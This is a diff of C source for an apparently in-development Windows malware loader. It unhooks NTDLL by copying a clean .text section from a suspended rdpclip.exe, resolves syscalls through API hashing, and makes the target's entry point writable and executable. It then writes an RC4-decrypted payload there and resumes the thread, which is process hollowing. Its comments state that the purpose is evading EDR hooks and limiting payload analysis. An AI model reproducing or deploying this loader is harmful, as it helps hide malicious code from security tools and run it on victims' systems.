@@ -121,10 +121,11 @@ void printByteArray(const unsigned char* array, size_t size) {
 }
 
 
-//Hooked = Base NTDLL address of local process since its not suspended
-//Unhooked = Remote process NTDLL (found @ same base address) but copied into local buffer
 
-/*
+
+
+
+/* Havent converted to unhooked syscalls yet - on the to do list also.. but to see how I've demonstrated the capability to do so with hollowProcess func
 void detectDebug() {
     // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag
 
@@ -352,7 +353,7 @@ DWORD HashStringDjb2A(_In_ PCHAR String)
 
 
 
-void ReadNTDLL(HANDLE hProcess, IN PVOID pLocalTextSection, IN PVOID pRemoteTextSection,IN DWORD sTextSize,OUT PVOID* pModuleBuffer) {
+void UnhookDLL(HANDLE hProcess, IN PVOID pLocalTextSection, IN PVOID pRemoteTextSection,IN DWORD sTextSize,OUT PVOID* pModuleBuffer) {
 
     //now we know do to shared memory address space of DLL's, we can copy the base address of our clean suspended process
     //and copy it into a new buffer in this process.
@@ -410,8 +411,8 @@ void CreateSuspendedProcess(IN char* processName, IN wchar_t* moduuleName, OUT P
         NULL,                 // Command line arguments
         NULL,                 // Process handle not inheritable
         NULL,                 // Thread handle not inheritable
-        FALSE,                // Set handle inheritance to FALSE
-        /*DEBUG_PROCESS*/CREATE_SUSPENDED,     // Creation flags (create in suspended state)
+        PROCESS_ALL_ACCESS,                // Set handle inheritance to FALSE
+        CREATE_SUSPENDED,     // Creation flags (create in suspended state), i like testing in suspended so i can debug but for dev use debug.
         NULL,                 // Use parent's environment block
         NULL,                 // Use parent's starting directory
         &si,                  // Pointer to STARTUPINFO structure
@@ -430,7 +431,6 @@ void CreateSuspendedProcess(IN char* processName, IN wchar_t* moduuleName, OUT P
     return;
   
 }
-
 
 BOOL GetAPIHashAddress(IN PVOID pModuleBase,IN PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, OUT SYSCALL* syscallTableEntry) {
 
@@ -463,12 +463,8 @@ BOOL GetAPIHashAddress(IN PVOID pModuleBase,IN PIMAGE_EXPORT_DIRECTORY pImageExp
 
 }
 
-
 BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
-
     printf("Size payload: %d\n", sPayload);
-
-
     //Now that we have the query process ifnormation syscall we can find the entry point of the process handle being passed
     //to do this we first find the PEB then using offsets calculate the entry point
 
@@ -477,76 +473,50 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 
     PROCESS_BASIC_INFORMATION basicInformation = { 0 };
     printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
-    //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
-    //NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
-    //myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
-
 
     //Because of API hashing we can obfuscate the struct and variable names but obviously not for readability.
+    //Here we can simply cast the function pointers to the appropriate function since we did the hard part in cleaning up NTDLL of hooks
+    //and then searching through the image export directory for function addresses!
+   
+    //At its core its an alternative to indirect syscalls which jump prior to triggering the EDR inserted hook since we removed them entirely.
+    //Down side is we're modifying memory protection values for NTDLL and doing a lot of operations in the .text region which looks very suspect.
     NtQueryInformationProcessPtr QueryFunc = (NtQueryInformationProcessPtr)syscallsStruct.Query.pAddress;
     NtReadVirtualMemoryPtr ReadFunc = (NtReadVirtualMemoryPtr)syscallsStruct.Read.pAddress;
     NtVirtualProtectMemoryPtr ProtectFunc = (NtVirtualProtectMemoryPtr)syscallsStruct.Protect.pAddress;
     NtResumeThreadPtr ResumeFunc = (NtResumeThreadPtr)syscallsStruct.Resume.pAddress;
     NtWriteVirtualMemoryPtr WriteFunc = (NtWriteVirtualMemoryPtr)syscallsStruct.Write.pAddress;
 
-
-
     NTSTATUS result = QueryFunc(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
-    //gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
-   
-    
+    //gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;    
     //Goal: NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
     printf("NTSTATUS????? %d", result);
     //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
     printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);
-
     //Now with PEB get offsets to image entry point 
-
     uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
     BYTE procAddr[64];
     BYTE procAddr2[64];
-
     BYTE dataBuff[0x200];
     SIZE_T bytesRW = 0;
-    // THis 64 is based on the architecture used...
 
-    //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     printf("Base Address: 0x%p\n", BaseAddress);
-    //getchar();
-    printf("Starting NoahRead\n");
-    //getchar();
-
-
-    //working - BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-
-    //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     printf("Proc Address (Empty 1): 0x%p\n", procAddr);
     printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
 
-    // BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-
-
-    // printf("RESULTSS????? %d, %d\n", result, bytesRW);
     getchar();
     result = ReadFunc(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     //goal: gCurrentSyscall = VxTable.Read.wRCXVal;
     //Goal: result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     getchar();
     printf("Enging NoahRead\n");
-
     printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
     printf("Proc Address (Empty 1): 0x%p\n", procAddr);
     printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
     printf("&Proc Address (Working): 0x%p\n", *procAddr);
     printf("&Proc Address (Noah): 0x%p\n", *procAddr2);
-
     getchar();
     uintptr_t executableAddress = *((uintptr_t*)procAddr);//
 
-    //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
-    //result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
-    
     result = ReadFunc(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
 
     //Goal: gCurrentSyscall = VxTable.Read.wRCXVal; // just for clairty
@@ -568,89 +538,52 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 
     PVOID sizeTest = (PVOID)sPayload;
 
-    //BOOL results = syscalls.myNtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
-    //result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
-    
     printf("gCurrentSyscall: %d\n", gCurrentSyscall);
     printf("Protect Num: %d\n", VxTable.Protect.wRCXVal);
     //Goal: gCurrentSyscall = VxTable.Protect.wRCXVal;
     //result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
     result = ProtectFunc(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
     printf("ntstatus RESULTSS????? 0x%x, %d\n", result, oldPerm);
-
-
-    //    BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
-    //BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
-
+    
     printf("Address of optional header offset: 0x%p\n", e_lfanew);
     printf("Address of entrypoint rva offset: 0x%p\n", rvaOffset);
     printf("Executable ADDR: 0x%lp\n", executableAddress);
     printf("Entrypoint ADDR: 0x%lp\n", test);
     printf("Entrypoint: 0x%lp\n", entrypointAddr);
     printf("Change Perms: %X\n", result);
+    
     getchar();
-
     printf("\nentrypoint: 0x%p\n", entrypointAddr);
     printf("pvoid entrypoint pvoid: 0x%p\n", (PVOID)entrypointAddr);
     printf("(PVOID)Test pvoid: 0x%p\n", (PVOID)test);
     printf("&Test pvoid : 0x % p\n", &test);
     printf("Test : 0x%p\n", test);
-
     getchar();
     ULONG read = 0;
-
-    //BOOL bruh = syscalls.myNtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
     Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText)); //Allow as little time to analzye payload a spossible, decrypt just before write
     printf("Key decrypted\n");
-    //BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
-    
-    
     //Goal: gCurrentSyscall = VxTable.Write.wRCXVal;
     //Goal: result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
     getchar();
     printf("Writing to entry point\n");
     result = WriteFunc(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
     printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
-
-    // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
-    //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
-
-    //if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
-
-    //results = syscalls.myNtWriteVirtualMemory(Pi.hProcess, (LPVOID)entrypointAddr, truePayload, sizeof(truePayload), &numBytesWritten);
-    //results =  (Pi.hProcess, (LPVOID)test, truePayload, sizeof(truePayload), &bytesRW);
     printf("WRote @ Address of entrypoint offset: 0x%p\n", test);
     printByteArray(Rc4CipherText, sizeof(Rc4CipherText));
     getchar();
 
     //ResumeThread(Pi.hThread);
     PULONG suspendCount;
-
-    //Sw3NtResumeThread(Pi.hThread, &suspendCount);
-    //goal: gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
+        //goal: gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
     //goal: result = NoahRead3(Pi.hThread, &suspendCount);
-    result = ResumeFunc(Pi.hThread, &suspendCount);
-    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, suspendCount);
+    result = ResumeFunc(Pi.hThread, NULL);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result);
 }
 
 
 int main() {
 
     initializeSystemCalls();
-
- //   STARTUPINFOA Si = { 0 };
- //   PROCESS_INFORMATION Pi = { 0 };
- //   BOOL success = FALSE;
- //   success = CreateProcessA("C:\\Windows\\System32\\Rdpclip.exe", NULL,
- //       NULL, //p handle cannot be inheritied by child process
- //       NULL, //thread handle cannot be inheritied yb child since NULL
- //       PROCESS_ALL_ACCESS,
- //       CREATE_SUSPENDED,
- //       NULL, //use def environmen vars
- //       NULL, //inherit current dir as parent.
- //       &Si,
- //       &Pi
- //   );
 
     PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
     //Read from GS register at 0x30 offset for TEB
@@ -671,7 +604,6 @@ int main() {
     //Now we need to get a clean copy of NTDLL in memory.
     PVOID pCleanNTDLL;
 
-
     //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
     PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
     PVOID pLocalText = NULL;
@@ -679,12 +611,9 @@ int main() {
     //just .text size actually
     DWORD dwDLLSize = 0; // expirementally about how many functions to expect :shrug:
     DWORD sImageSize = 0;
-    GetImageExportDir(pNtdllBase, &ppImageExportDirectory, &pRemoteText, &pLocalText, &dwDLLSize,&sImageSize);
-    
-    
+    GetImageExportDir(pNtdllBase, &ppImageExportDirectory, &pRemoteText, &pLocalText, &dwDLLSize, &sImageSize);
+
     printf("Parsed data:\nLocal Text Section: 0x%p\nLocal Text Section Size: %d\n\n\n", pLocalText, sLocalTextSection);
-    
-    
     printf("DLL Size (bytes): %d\n", sImageSize);
 
     const char* procName = "C:\\Windows\\System32\\rdpclip.exe";
@@ -697,15 +626,9 @@ int main() {
 
 
     PVOID pLocalUnhookedModule = NULL;
-    ReadNTDLL(piSuspended.hProcess, pLocalText, pRemoteText, sLocalTextSection, &pLocalUnhookedModule);
+    UnhookDLL(piSuspended.hProcess, pLocalText, pRemoteText, sLocalTextSection, &pLocalUnhookedModule);
 
     //Now we have an unhooked NTDLL so we  can use systemcalls and avoid api hooking from EDR
-
-
-
-
-
-
     
     SYSCALL Read = { 0 };
     SYSCALL Write = { 0 };
@@ -742,103 +665,10 @@ int main() {
     syscallsStruct.Query.dwHash = strtoull("4F0DBC50", NULL, 16);
     GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Query);
 
-
-
     //detectdebug
 
     hollowProcess(piSuspended, sizeof(Rc4CipherText));
 
- 
-
-
-//    () = ()GetProcAddress(hUnhookedDLL, "NtWriteProcessMemory");
-
-
-
-   // ReadNTDLL(piSuspended.hProcess, pLocalText, sLocalTextSection,&pLocalUnhookedModule);
-    // This was a bit unintu
-    // 
-    // 
-    // itive to me at first, but because different processes share these DLL's (thats sorta what they're designed to be used for!)
-    // we dont actually need to read the newly created, suspended process, for the base NTDLL address within its memory space.  We can 
-    // use the NTDLL base address within this CURRENT process and that will also work for our remote process.  its why different processes can use the same 
-    // memory location to call the same function. same thought process. Makes it MUCH more convinient then what i initialy tried doing.
-    
-    
-
-    //GetModuleBaseAddress(piSuspended.hProcess, L"ntdll.dll", &dwpRemoteModuleBase);
-    /*
-    VX_TABLE_ENTRY Write = { 0 };
-    VX_TABLE_ENTRY Read = { 0 };
-    VX_TABLE_ENTRY Allocate = { 0 };
-    VX_TABLE_ENTRY Protect = { 0 };
-    VX_TABLE_ENTRY ResumeThread = { 0 };
-    VX_TABLE_ENTRY QueryInfoProcess = { 0 };
-    VX_TABLE_ENTRY Create = { 0 };
-    VX_TABLE_ENTRY MapViewOfSection= { 0 };
-
-    //Hashes retrieved from Hasher code
-    VxTable.Write = Write;
-    VxTable.Write.dwHash = strtoull("C1189C40", NULL, 16);
-
-    VxTable.Read = Read;
-    VxTable.Read.dwHash = strtoull("BE6B6431", NULL, 16);
-
-    VxTable.Allocate = Allocate;
-    VxTable.Allocate.dwHash = strtoull("FE83CCDA", NULL, 16);
-
-    VxTable.Protect = Protect;
-    VxTable.Protect.dwHash = strtoull("87C51496", NULL, 16);
-
-    VxTable.ResumeThread = ResumeThread;
-    VxTable.ResumeThread.dwHash = strtoull("2F7CB09E", NULL, 16);
-
-    VxTable.QueryInfoProcess = QueryInfoProcess;
-    VxTable.QueryInfoProcess.dwHash = strtoull("4F0DBC50", NULL, 16);
-
-    VxTable.Create = Create;
-    VxTable.Create.dwHash = strtoull("1A862429", NULL, 16);
-
-    VxTable.MapViewOfSection= MapViewOfSection;
-    VxTable.MapViewOfSection.dwHash = strtoull("CB5EF918", NULL, 16);
-
-    printf("0x%0.8X\n", VxTable.Protect.dwHash);
-
-    printf("Struct populated...\n");
-
-    //Now with the image export directory we can loop through function names and find the desired functions for syscalls!
-    printf("Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %d\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
-
-    // i wish there was a way to pass the entire struct and then loop through this
-
-    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Read);
-    VxTable.Read.wRCXVal = 0;
-    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Write);
-    VxTable.Write.wRCXVal = 1;
-    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Allocate);
-    VxTable.Allocate.wRCXVal = 2;
-    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Protect);
-    VxTable.Protect.wRCXVal = 3;
-    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.ResumeThread);
-    VxTable.ResumeThread.wRCXVal = 4;
-    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.QueryInfoProcess);
-    VxTable.QueryInfoProcess.wRCXVal = 5;
-    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Create);
-    VxTable.Create.wRCXVal = 6;
-    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.MapViewOfSection);
-    VxTable.MapViewOfSection.wRCXVal =7;
-    //detectDebug();
-
-    printf("Second run: Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %hu\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
-    //Now we just have to call the function using assembly temmplates!
-    getchar();
-
-    PCWSTR dllPath = L"\\??\\C:\\windows\\system32\\ntdll.dll"; //This should probably be hashed....
-
-    UnhookDLL(dllPath);
- 
-
-    */
     getchar();
     return 0;
 }
